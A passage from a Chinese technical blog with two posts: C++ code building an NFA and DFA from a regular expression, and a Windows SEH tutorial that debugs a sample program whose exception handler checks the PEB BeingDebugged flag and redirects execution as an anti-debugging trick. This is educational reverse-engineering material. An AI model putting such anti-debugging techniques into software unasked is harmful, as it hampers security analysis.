class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> e : node.postEdges)</span><br><span class="line">    &#123;</span><br><span class="line">        GraphEdge &amp;edge = edges[e];</span><br><span class="line">        c = edge.<span class="built_in">getCharacter</span>();</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="built_in">backtracing_judge</span>(edge.to, current_index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (c == toJudge[current_index])</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="built_in">backtracing_judge</span>(edge.to, current_index + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">NFA::getEpsilon</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt; T)</span></span>&#123;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">    <span class="type">bool</span> visited[maxn];</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; epsilon;</span><br><span class="line">    <span class="built_in">memset</span>(visited,<span class="literal">false</span>,<span class="built_in">sizeof</span>(visited));</span><br><span class="line">    <span class="type">int</span> current_index;</span><br><span class="line">    <span class="type">int</span> next_index;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> u:T)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visited[u]==<span class="literal">false</span>)&#123;</span><br><span class="line">            visited[u]=<span class="literal">true</span>;</span><br><span class="line">            s.<span class="built_in">push</span>(u);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        current_index=s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        epsilon.<span class="built_in">push_back</span>(current_index);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> e:nodes[current_index].postEdges)&#123;</span><br><span class="line">            GraphEdge &amp;edge=edges[e];</span><br><span class="line">            <span class="keyword">if</span>(edge.<span class="built_in">getCharacter</span>()==<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">                next_index=edge.<span class="built_in">getTo</span>();</span><br><span class="line">                <span class="keyword">if</span>(visited[next_index]==<span class="literal">false</span>)&#123;</span><br><span class="line">                    visited[next_index]=<span class="literal">true</span>;</span><br><span class="line">                    s.<span class="built_in">push</span>(next_index);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> epsilon;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从S集合开始,经过character字符能够转移到的状态集合</span></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">NFA::smove</span><span class="params">(std::vector&lt;<span class="type">int</span>&gt; S,<span class="type">char</span> character)</span></span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">    <span class="type">bool</span> visited[maxn];</span><br><span class="line">    <span class="built_in">memset</span>(visited,<span class="number">0</span>,<span class="built_in">sizeof</span>(visited));</span><br><span class="line">    <span class="type">int</span> next_index;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_index:S)&#123;</span><br><span class="line">        GraphNode &amp;node=nodes[current_index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> e:node.postEdges)&#123;</span><br><span class="line">            GraphEdge &amp;edge=edges[e];</span><br><span class="line">            next_index=edge.<span class="built_in">getTo</span>();</span><br><span class="line">            <span class="keyword">if</span>(edge.<span class="built_in">getCharacter</span>()==character&amp;&amp;visited[next_index]==<span class="literal">false</span>)&#123;</span><br><span class="line">                visited[next_index]=<span class="literal">true</span>;</span><br><span class="line">                result.<span class="built_in">push_back</span>(next_index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">NFA::no_backtracing_judge</span><span class="params">(<span class="type">const</span> std::string &amp;str)</span></span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; S=<span class="built_in">getEpsilon</span>(&#123;start&#125;);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> c:str)&#123;</span><br><span class="line">        S=<span class="built_in">getEpsilon</span>(<span class="built_in">smove</span>(S,c));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">find</span>(S.<span class="built_in">begin</span>(),S.<span class="built_in">end</span>(),finish)!=S.<span class="built_in">end</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="验证">验证</h3>
<p>为了验证算法正确性,info函数会根据mermaid
graph图的语法打印,结果贴到typora mermaid代码块中即可可视化</p>
<p>输入的表达式是<code>(a|b)*.a.b.b</code>,</p>
<p>程序的运行结果是</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a b | * a . b . b . </span><br><span class="line">cnt_edges=13</span><br><span class="line">1((<span class="number">1</span>))</span><br><span class="line">2((<span class="number">2</span>))</span><br><span class="line">3((<span class="number">3</span>))</span><br><span class="line">4((<span class="number">4</span>))</span><br><span class="line">5((<span class="number">5</span>))</span><br><span class="line">6((<span class="number">6</span>))</span><br><span class="line">7((<span class="number">7</span>))</span><br><span class="line">8((<span class="number">8</span>))</span><br><span class="line">9((<span class="number">9</span>))</span><br><span class="line">10((<span class="number">10</span>))</span><br><span class="line">11((<span class="number">11</span>))</span><br><span class="line"></span><br><span class="line">3--a--&gt;4</span><br><span class="line">5--b--&gt;6</span><br><span class="line">2----&gt;3</span><br><span class="line">2----&gt;5</span><br><span class="line">4----&gt;7</span><br><span class="line">6----&gt;7</span><br><span class="line">1----&gt;2</span><br><span class="line">1----&gt;8</span><br><span class="line">7----&gt;2</span><br><span class="line">7----&gt;8</span><br><span class="line">8--a--&gt;9</span><br><span class="line">9--b--&gt;10</span><br><span class="line">10--b--&gt;11</span><br></pre></td></tr></table></figure>
<p>把其中的mermaid语法抠出来乎到typora mermaid代码块中得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">    1((1))</span><br><span class="line">    2((2))</span><br><span class="line">    3((3))</span><br><span class="line">    4((4))</span><br><span class="line">    5((5))</span><br><span class="line">    6((6))</span><br><span class="line">    7((7))</span><br><span class="line">    8((8))</span><br><span class="line">    9((9))</span><br><span class="line">    10((10))</span><br><span class="line">    11((11))</span><br><span class="line"></span><br><span class="line">    3--a--&gt;4</span><br><span class="line">    5--b--&gt;6</span><br><span class="line">    2----&gt;3</span><br><span class="line">    2----&gt;5</span><br><span class="line">    4----&gt;7</span><br><span class="line">    6----&gt;7</span><br><span class="line">    1----&gt;2</span><br><span class="line">    1----&gt;8</span><br><span class="line">    7----&gt;2</span><br><span class="line">    7----&gt;8</span><br><span class="line">    8--a--&gt;9</span><br><span class="line">    9--b--&gt;10</span><br><span class="line">    10--b--&gt;11</span><br></pre></td></tr></table></figure>
<p>教材上给出的NFA图是</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221019120541112.png"
alt="image-20221019120541112" />
<figcaption aria-hidden="true">image-20221019120541112</figcaption>
</figure>
<p>我从1开始给节点编号,教材从0开始给节点编号</p>
<p>显然结构是相同的</p>
<h2 id="n2d">n2d</h2>
<p>DFA中的每个节点都是NFA的状态集合,但是DFA建立之后就不需要NFA的状态了</p>
<p>只需要维护边上的字符</p>
<p>使用map判定一个状态集合是否已经存在过</p>
<h3 id="dfa.h">DFA.h</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Graph.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;NFA.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DFA</span>:</span>public Graph&#123;</span><br><span class="line">    NFA &amp;nfa;</span><br><span class="line">    </span><br><span class="line">    DFA(NFA &amp;n);</span><br><span class="line"></span><br><span class="line">    friend <span class="built_in">std</span>::ostream &amp;operator&lt;&lt;(<span class="built_in">std</span>::ostream &amp;os,DFA &amp;dfa);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="dfa.cpp">DFA.cpp</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DFA.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;NFA.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> std::pair&lt;std::vector&lt;HNODE&gt;,HNODE&gt; Record;</span><br><span class="line">DFA::<span class="built_in">DFA</span>(NFA &amp;n):<span class="built_in">nfa</span>(n)&#123;</span><br><span class="line">    <span class="built_in">newNode</span>(<span class="built_in">GraphNode</span>());</span><br><span class="line">    std::map&lt;std::vector&lt;HNODE&gt;,HNODE&gt; table;</span><br><span class="line">    std::queue&lt;std::vector&lt;HNODE&gt; &gt; q;</span><br><span class="line">    HNODE hNode_current;</span><br><span class="line">    HNODE hNode_next;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;HNODE&gt; current_statements=nfa.<span class="built_in">getEpsilon</span>(&#123;nfa.hNode_start&#125;);</span><br><span class="line">    hNode_current=<span class="built_in">newNode</span>(<span class="built_in">GraphNode</span>());</span><br><span class="line">    std::vector&lt;HNODE&gt; next_statments;</span><br><span class="line">    table.<span class="built_in">insert</span>(<span class="built_in">Record</span>(current_statements,hNode_current));</span><br><span class="line">    q.<span class="built_in">push</span>(current_statements);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        current_statements=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        hNode_current=table[current_statements];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;c&lt;=<span class="string">&#x27;z&#x27;</span>;++c)&#123;</span><br><span class="line">            next_statments=nfa.<span class="built_in">getEpsilon</span>(nfa.<span class="built_in">smove</span>(current_statements,c));</span><br><span class="line">            <span class="keyword">if</span>(next_statments.<span class="built_in">empty</span>())<span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(table.<span class="built_in">find</span>(next_statments)==table.<span class="built_in">end</span>())&#123;</span><br><span class="line">                hNode_next=<span class="built_in">newNode</span>(<span class="built_in">GraphNode</span>());</span><br><span class="line">                table.<span class="built_in">insert</span>(<span class="built_in">Record</span>(next_statments,hNode_next));</span><br><span class="line">                q.<span class="built_in">push</span>(next_statments);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                hNode_next=table[next_statments];</span><br><span class="line">            &#125;</span><br><span class="line">            nodes[hNode_current].<span class="built_in">addEdge</span>(<span class="built_in">newEdge</span>(<span class="built_in">GraphEdge</span>(hNode_current,hNode_next,c)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;os,DFA &amp;dfa)&#123;</span><br><span class="line">    <span class="keyword">for</span>(HNODE hNode=<span class="number">1</span>;hNode&lt;dfa.nodes.<span class="built_in">size</span>();hNode++)&#123;</span><br><span class="line">        os&lt;&lt;hNode&lt;&lt;<span class="string">&quot;((&quot;</span>&lt;&lt;hNode&lt;&lt;<span class="string">&quot;))&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> edge:dfa.edges)&#123;</span><br><span class="line">        os&lt;&lt;edge&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>验证</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110095752738.png"
alt="image-20221110095752738" />
<figcaption aria-hidden="true">image-20221110095752738</figcaption>
</figure>
<h2 id="dfa最小化">DFA最小化</h2>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/24/SEH/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/24/SEH/" class="post-title-link" itemprop="url">SEH</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-24 23:44:00 / Modified: 23:44:44" itemprop="dateCreated datePublished" datetime="2022-09-24T23:44:00+08:00">2022-09-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="seh">SEH</h1>
<p>windows异常处理程序,存储在<strong>栈中</strong></p>
<h2 id="seh链">SEH链</h2>
<p>SEH链实际上就是一个链表,其基本单位是一个个的节点</p>
<p>每个节点都是由一个后向指针(指针域)和一个函数指针(值域)组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//指向下一个节点</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;<span class="comment">//指向函数</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
<p>Next不必多说,Handler是一个有固定格式的函数,其函数接口长这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION <span class="title function_">myHandler</span><span class="params">(<span class="comment">//返回值为枚举类型,表明本函数处理结束后程序的走向</span></span></span><br><span class="line"><span class="params">    EXCEPTION_RECORD *pRecord,</span></span><br><span class="line"><span class="params">    EXCEPTION_REGISTRATION_RECORD *pFrame,</span></span><br><span class="line"><span class="params">    PCONTEXT Context,<span class="comment">//线程上下文,包括各种寄存器值</span></span></span><br><span class="line"><span class="params">    PVOID pValue,</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>这四个参数会由OS传给异常处理函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;<span class="comment">//异常编号</span></span><br><span class="line">    DWORD ExceptionFlags;<span class="comment">//异常标志</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span><span class="comment">//</span></span><br><span class="line">    PVOID ExceptionAddress;<span class="comment">//异常发生地址</span></span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
<p>返回值是一个枚举类型,在excpt.h中可以找到其定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exception disposition return values</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">EXCEPTION_DISPOSITION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ExceptionContinueExecution,<span class="comment">//继续执行异常代码</span></span><br><span class="line">    ExceptionContinueSearch,<span class="comment">//执行seh链上下一个异常处理</span></span><br><span class="line">    ExceptionNestedException,<span class="comment">//OS内部使用</span></span><br><span class="line">    ExceptionCollidedUnwind<span class="comment">//OS内部使用</span></span><br><span class="line">&#125; EXCEPTION_DISPOSITION;</span><br></pre></td></tr></table></figure>
<p>SEH链画在图上相当于</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924093920177.png"
alt="image-20220924093920177" />
<figcaption aria-hidden="true">image-20220924093920177</figcaption>
</figure>
<p>最后一个节点的next指向FFFFFFFF,即-1,表明SEH链结束</p>
<h2 id="访问进程seh链">访问进程SEH链</h2>
<p>TEB+0x00存放的是NtTib结构体基地址</p>
<p>这个NtTib长啥样呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span><span class="comment">//seh链表头</span></span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure>
<p>NtTib在TEB的0偏移位置,ExceptionList在NtTib的偏移位置,FS段选择子指向TEB描述符,因此</p>
<p><code>FS:[0]=TEB=TEB.NtTib=TEB.NtTib.ExceptionList</code></p>
<p>如此就可以访问SEH链表了,这里ExceptionList相当于一个附加头节点</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924100243035.png"
alt="image-20220924100243035" />
<figcaption aria-hidden="true">image-20220924100243035</figcaption>
</figure>
<h2 id="安装seh节点">安装SEH节点</h2>
<p>c语言中使用<code>__try,__except,__finally</code>关键字</p>
<p>汇编语言中只需要将SEH节点头插进入SEH节点就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH &amp;myHandler	;seh节点的函数地址压栈</span><br><span class="line">PUSH DWORD PTR FS:[0] ;seh节点的后向指针压栈,头插法采用原来的头</span><br><span class="line">MOV DWORD PTR FS:[0],ESP	;当前节点正好位于栈顶,将其地址放到ExceptionList上覆盖原来的头节点</span><br></pre></td></tr></table></figure>
<p>当前节点成为SEH链的第一个节点</p>
<h2 id="调试观察seh工作流程">调试观察SEH工作流程</h2>
<h3 id="main之前建立的seh链">main之前建立的seh链</h3>
<p>用ida打开seh.exe观察</p>
<p>使用od动态调试seh.exe,让程序先运行到main函数0x401000处</p>
<p>od已经识别出main一开始干了啥了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101626865.png"
alt="image-20220924101626865" />
<figcaption aria-hidden="true">image-20220924101626865</figcaption>
</figure>
<p>在头插之前,先看一下原来的第一个seh节点</p>
<p>此时<code>fs:[00000000]=[00386000]=0019FF64</code>,去栈中0x19FF64看看</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101716815.png"
alt="image-20220924101716815" />
<figcaption aria-hidden="true">image-20220924101716815</figcaption>
</figure>
<p>下一个seh节点在0x19FFCC位置,本seh节点的异常处理函数在0x402730,用ida观察这个位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101908760.png"
alt="image-20220924101908760" />
<figcaption aria-hidden="true">image-20220924101908760</figcaption>
</figure>
<p>这个函数很大,看地址是在用户空间的,不是DLL中的也不是内核中的,那么它是啥时候注册的呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start()</span><br><span class="line">	___tmainCRTStartup()</span><br><span class="line">		__cinit()</span><br><span class="line">			__IsNonwritableInCurrentImage()</span><br><span class="line">    	main()</span><br></pre></td></tr></table></figure>
<p>在main之前<code>___tmainCRTStartup</code>会首先调用<code>__cinit</code>进行注册,然后才会调用<code>main</code></p>
<p>也就是说,这是运行库注册的</p>
<h3 id="注册新的seh节点">注册新的seh节点</h3>
<p>注意此时只是注册,其中的异常处理函数也是一个回调函数,不会立刻执行,需要确实发现异常的时候才会执行</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924100616558.png"
alt="image-20220924100616558" />
<figcaption aria-hidden="true">image-20220924100616558</figcaption>
</figure>
<p>main函数首先插入了一个seh节点,其异常处理函数在0x40105A处,这个函数干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0040105A loc_40105A:                             ; DATA XREF: _main↑o</span><br><span class="line">.text:0040105A                 mov     esi, [esp+0Ch];esi指向栈中0x19f470</span><br><span class="line">.text:0040105E                 mov     eax, large fs:30h;PEB地址</span><br><span class="line">.text:00401064                 cmp     byte ptr [eax+2], 1;检查是否BeingDebugged</span><br><span class="line">.text:00401068                 jnz     short loc_401076;如果不是则跳转0x4001076,否则顺序执行</span><br><span class="line">.text:0040106A                 mov     dword ptr [esi+0B8h], offset loc_401023;将0x401023写到esi+0xB8h的地方</span><br><span class="line">.text:00401074                 jmp     short loc_401080;跳转函数尾声</span><br><span class="line">.text:00401076 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401076</span><br><span class="line">.text:00401076 loc_401076:                             ; CODE XREF: .text:00401068↑j</span><br><span class="line">.text:00401076                 mov     dword ptr [esi+0B8h], offset loc_401039</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 loc_401080:                             ; CODE XREF: .text:00401074↑j</span><br><span class="line">.text:00401080                 xor     eax, eax</span><br><span class="line">.text:00401082                 retn;返回了</span><br></pre></td></tr></table></figure>
<p>这个函数检查了当前是否处于调试状态,根据该状态将不同的函数地址,写到esi+0xB8h指向的地方</p>
<p>这是个什么地方呢?Context.Eip,干啥用的呢?留作后话</p>
<p>当我们的seh节点注册完毕之后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp=0019FF28</span><br><span class="line">fs:[00000000]=[00386000]=0019FF28</span><br></pre></td></tr></table></figure>
<p>此时ExceptionList已经指向0x19FF28了,栈中观察这个位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924105650611.png"
alt="image-20220924105650611" />
